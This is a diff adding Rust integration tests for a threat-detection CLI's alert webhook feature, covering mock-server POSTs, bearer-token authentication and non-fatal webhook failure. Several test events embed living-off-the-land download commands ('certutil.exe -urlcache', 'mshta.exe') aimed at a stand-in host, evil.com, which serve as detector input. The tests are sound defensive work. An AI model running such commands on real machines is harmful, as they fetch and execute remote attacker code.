@@ -3591,3 +3591,151 @@ fn replay_pipe_to_alert_stdin() {
         assert!(parsed["alert_type"].is_string());
     }
 }
+
+// ---------------------------------------------------------------------------
+// Alert webhook tests
+// ---------------------------------------------------------------------------
+
+#[test]
+fn alert_webhook_help() {
+    cmd().args(["alert", "--help"]).assert().success().stdout(
+        predicate::str::contains("--webhook")
+            .and(predicate::str::contains("--webhook-token")),
+    );
+}
+
+#[test]
+fn alert_webhook_posts_to_server() {
+    // Start a mock HTTP server.
+    let mut server = mockito::Server::new();
+    let mock = server.mock("POST", "/alerts")
+        .match_header("content-type", "application/json")
+        .with_status(200)
+        .expect_at_least(1)
+        .create();
+
+    let event = sample_process_create_key(
+        "ac000000-0000-0000-0000-000000000001",
+        200, 1,
+        "C:/Windows/System32/certutil.exe",
+        "certutil.exe -urlcache http://evil.com",
+        "2026-03-13T10:00:00Z",
+        "200:5000",
+    );
+
+    let webhook_url = format!("{}/alerts", server.url());
+
+    let mut child = std::process::Command::new(
+        assert_cmd::cargo::cargo_bin("threatfalcon"),
+    )
+    .args([
+        "alert", "--input", "-", "--json",
+        "--webhook", &webhook_url,
+    ])
+    .stdin(std::process::Stdio::piped())
+    .stdout(std::process::Stdio::piped())
+    .stderr(std::process::Stdio::piped())
+    .spawn()
+    .unwrap();
+
+    {
+        let stdin = child.stdin.as_mut().unwrap();
+        writeln!(stdin, "{event}").unwrap();
+    }
+    child.stdin.take();
+
+    let output = child.wait_with_output().unwrap();
+    assert!(output.status.success());
+
+    // Verify the mock received the POST.
+    mock.assert();
+
+    // stdout should still have the alert.
+    let stdout = String::from_utf8(output.stdout).unwrap();
+    assert!(stdout.contains("lolbin"), "expected lolbin alert on stdout too, got: {stdout}");
+}
+
+#[test]
+fn alert_webhook_with_bearer_token() {
+    let mut server = mockito::Server::new();
+    let mock = server.mock("POST", "/alerts")
+        .match_header("authorization", "Bearer test-secret-token")
+        .with_status(200)
+        .expect_at_least(1)
+        .create();
+
+    let event = sample_detection_event(
+        "ad000000-0000-0000-0000-000000000001",
+        "TF-EVA-001",
+    );
+
+    let webhook_url = format!("{}/alerts", server.url());
+
+    let mut child = std::process::Command::new(
+        assert_cmd::cargo::cargo_bin("threatfalcon"),
+    )
+    .args([
+        "alert", "--input", "-", "--json",
+        "--webhook", &webhook_url,
+        "--webhook-token", "test-secret-token",
+    ])
+    .stdin(std::process::Stdio::piped())
+    .stdout(std::process::Stdio::piped())
+    .stderr(std::process::Stdio::piped())
+    .spawn()
+    .unwrap();
+
+    {
+        let stdin = child.stdin.as_mut().unwrap();
+        writeln!(stdin, "{event}").unwrap();
+    }
+    child.stdin.take();
+
+    let output = child.wait_with_output().unwrap();
+    assert!(output.status.success());
+
+    // Verify the mock received the POST with correct auth header.
+    mock.assert();
+}
+
+#[test]
+fn alert_webhook_failure_does_not_crash() {
+    // Webhook to a non-existent server should log error but not crash.
+    let event = sample_process_create_key(
+        "ae000000-0000-0000-0000-000000000001",
+        300, 1,
+        "C:/Windows/System32/mshta.exe",
+        "mshta.exe http://evil.com",
+        "2026-03-13T10:00:00Z",
+        "300:6000",
+    );
+
+    let mut child = std::process::Command::new(
+        assert_cmd::cargo::cargo_bin("threatfalcon"),
+    )
+    .args([
+        "alert", "--input", "-", "--json",
+        "--webhook", "http://127.0.0.1:1",
+    ])
+    .stdin(std::process::Stdio::piped())
+    .stdout(std::process::Stdio::piped())
+    .stderr(std::process::Stdio::piped())
+    .spawn()
+    .unwrap();
+
+    {
+        let stdin = child.stdin.as_mut().unwrap();
+        writeln!(stdin, "{event}").unwrap();
+    }
+    child.stdin.take();
+
+    let output = child.wait_with_output().unwrap();
+    // Should still succeed — webhook failure is non-fatal.
+    assert!(output.status.success());
+    // Alert should still appear on stdout.
+    let stdout = String::from_utf8(output.stdout).unwrap();
+    assert!(!stdout.is_empty(), "alerts should still appear on stdout despite webhook failure");
+    // Stderr should mention the webhook error.
+    let stderr = String::from_utf8(output.stderr).unwrap();
+    assert!(stderr.contains("webhook error"), "expected webhook error in stderr, got: {stderr}");
+}
